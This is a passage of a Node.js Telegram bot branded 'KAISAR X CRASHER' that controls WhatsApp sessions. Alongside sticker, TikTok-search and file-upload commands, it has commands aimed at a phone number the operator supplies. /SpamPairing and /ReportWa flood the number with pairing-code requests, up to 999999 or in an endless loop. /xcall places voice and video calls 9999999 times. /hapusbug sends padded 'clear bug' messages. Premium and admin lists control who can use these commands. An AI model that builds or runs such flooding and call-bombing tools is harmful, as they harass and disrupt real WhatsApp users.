    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Selesai Cok..');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

// COMMAND STIKTOK
bot.onText(/\/stiktok(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const keyword = match[1];

  if (!keyword) {
    return bot.sendMessage(
      chatId,
      '❌ Mohon masukkan kata kunci. Contoh: /stiktok sad'
    );
  }

  try {
    const response = await axios.post(
      'https://api.siputzx.my.id/api/s/tiktok',
      { query: keyword },
      { headers: { 'Content-Type': 'application/json' } }
    );

    const data = response.data;

    if (!data.status || !data.data || data.data.length === 0) {
      return bot.sendMessage(
        chatId,
        '⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.'
      );
    }

    const videos = data.data.slice(0, 3);

    let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

    videos.forEach((video) => {
      replyText += `🎬 *${video.title.trim()}*\n`;
      replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
      replyText += `▶️ [Link Video](${video.play})\n`;
      replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
      replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
    });

    bot.sendMessage(chatId, replyText, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      '❌ Terjadi kesalahan saat mengambil data TikTok.'
    );
  }
});

bot.onText(/^\/tourl$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendMessage(
      chatId,
      "🪧 ☇ Format: /tourl (reply dengan foto atau video)",
      { reply_to_message_id: msg.message_id }
    );
  }

  let fileId = null;

  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return bot.sendMessage(
      chatId,
      "❌ ☇ Hanya mendukung foto atau video",
      { reply_to_message_id: msg.message_id }
    );
  }

  const loadingFrames = [
    "▰▱▱▱▱▱▱▱▱▱",
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▰▰"
  ];

  const waitMsg = await bot.sendMessage(chatId, `
 ⏳ ☇ Proccessing......\n${loadingFrames[0]}`,
    { reply_to_message_id: msg.message_id }
  );

  let loadingIndex = 0;
  const loadingInterval = setInterval(() => {
    loadingIndex = (loadingIndex + 1) % loadingFrames.length;
    bot.editMessageText(`
 ⏳ ☇ Proccessing......\n${loadingFrames[loadingIndex]}`,
      {
        chat_id: chatId,
        message_id: waitMsg.message_id
      }
    ).catch(() => {});
  }, 400);

  try {
    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const uploadedUrl = await uploadToCatbox(fileLink);

    clearInterval(loadingInterval);

    if (
      typeof uploadedUrl === "string" &&
      /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())
    ) {
      await bot.sendMessage(
        chatId,
        `
🔗 ☇ ᴜᴘʟᴏᴀᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ
──────────────────
${uploadedUrl.trim()}
<b><u>⎋ KAISAR X CRASHER</u></b>`,
        {
          reply_to_message_id: msg.message_id,
          parse_mode: "HTML"
        }
      );
    } else {
      await bot.sendMessage(
        chatId,
        "❌ ☇ Gagal upload ke Catbox.\n" +
          String(uploadedUrl).slice(0, 200),
        { reply_to_message_id: msg.message_id }
      );
    }
  } catch (e) {
    clearInterval(loadingInterval);

    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";

    await bot.sendMessage(chatId, msgError, {
      reply_to_message_id: msg.message_id
    });
  } finally {
    setTimeout(() => {
      bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    }, 1000);
  }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();
    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/xcall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /xcall 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /xcall 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/crk3w7.jpg", {
    caption: `┏━━━━━━〣 KAISAR X CRASHER 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAPONG TAMVAN¿?"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By KAISAR😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/ReportWa (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /ReportWa 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});


bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ UPdate Selesai\n🔁 Proses Restart Otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); 
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/dellbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`js
╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`js
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
